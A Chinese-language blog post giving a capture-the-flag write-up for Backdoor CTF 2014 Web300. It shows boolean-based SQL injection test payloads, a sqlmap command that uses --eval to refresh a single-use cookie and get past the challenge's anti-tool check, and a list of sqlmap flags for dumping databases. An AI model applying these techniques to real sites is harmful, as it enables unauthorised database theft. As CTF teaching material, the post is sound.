---
layout: post
title: "Backdoor CTF 2014 Web300 write-up"
date: 2014-03-23 13:47:44 +0800
comments: true
categories: [ctf, backdoor, web]
---

這次CTF不難  早上11:00開始玩到晚上12:00時已經差三題全解,
後來 Orange 出手成績直接爆表

{% img /images/writeup/backdoor2014_scoreboard.PNG %}

有趣的是主辦單位在規則上寫說:

>The competition requires you to find flags to gain points. Some flags can be gained by completing tasks, others are hidden in different places.

這不是讓大家去打網站嗎OTZ....

當時整個網頁都翻過之後才看到IRC上說hidden flag總共四把
*其實我很想寫第五把hidden flag的write up,但是好像要先問過人家願不願意被公開(flee*


總之在一般的題目裡,值得寫writeup的只有web300
<!-- more -->

直接看題目

>
H4x0r is making a new website and has decided to give you beta access! Head over here to register. 

網頁連進去後有register, status, login三個頁面

{% img /images/writeup/backdoor2014_w300_register.PNG %}

{% img /images/writeup/backdoor2014_w300_status.PNG %}


其中有問題的是 status.php

輸入存在的使用者會

{% img /images/writeup/backdoor2014_w300_status_valid.PNG %}

不存在時

{% img /images/writeup/backdoor2014_w300_invalid.PNG %}

這個頁面存在 boolean-based sql injection  簡單用一對一錯的sql injection試一下就知道

```sql
' or 1='1 
' and 2='1
```

知道是boolean-based的sql injection 直接拿sql map出來跑

這邊一定要提一下Atdog前面解w100時(也是bool sql injection)靠北了一句話

>我還是第一次看到ctf的題目 sqlmap可以直接爆的

不過這題是三百分,有擋工具 如果使用工具的話會被偵測出來

{% img /images/writeup/backdoor2014_w300_status_block.PNG %}

在這邊就做了一些猜測,  是檢查 user-agent? IP bind cookie? frequency rate? 

最後發現status頁面會 set cookie,  post過去的頁面會delete cookie.

cookie只能用一次,且鎖php session

{% img /images/writeup/backdoor2014_w300_status_setcookie.PNG %}


這時就會發現SQLmap真的很強大, 可以自訂每次request 前執行的動作 修改每次的cookie/parameter

{% img /images/writeup/backdoor2014_sqlmap_eval_usage.PNG %}

而eval修改cookie的功能是去年加上去的

{% img /images/writeup/backdoor2014_sqlmap_not_suppot_cookie.PNG %}

{% img /images/writeup/backdoor2014_sqlmap_eval_cookies.PNG %}


最後就是用sqlmap eval 去讀status.php取得cookie  就可以爆db了

```python
import requests;
web_300_token=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php',headers={'User-Agent': 'SQLI'},cookies=dict(PHPSESSID='s60g4fnru4scvr8agl7rvnaji4')).cookies['web_300_token']
```

值得注意的是sqlmap跟status要用同一組php session key 不然還是會錯.

Payload
```console
sqlmap -u http://backdoor.cognizance.org.in/problems/web300/check.php \
           --data="username=a" --string="This user has been validated"\
           --cookie="web_300_token=25b71a45869d38c2a509116149245865;  \
           PHPSESSID=s60g4fnru4scvr8agl7rvnaji4" \
           --user-agent="SQLI" \
           --referer="http://backdoor.cognizance.org.in/problems/web300/status.php" \
           --eval="import requests;\
                   web_300_token=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php',\
                   headers={'User-Agent': 'SQLI'},\
                   cookies=dict(PHPSESSID='s60g4fnru4scvr8agl7rvnaji4')).cookies['web_300_token']"
```


相關參數
```console
-u url
--data Post的資料
--string SQL指令執行是true web會回傳的關鍵字
--not-string SQL指令執行是false web會回傳的關鍵字
--cookie 指定cookie
--user-agent 指定user agent
--referer 指定ref page
--eval 每次request前須執行的指令
```
撈資料
```console
--users 撈db帳號
--databases 撈db
--tables 撈table , 可用-D 指定database
--columns 撈欄位 , 可用-T 指定table
--dump 撈資料, 要用-C 指定欄位 -T 指定table 
--dump-all 撈所有資料 再bool-based底下會很慢
--threads 指定同時run幾隻 加快速度
```









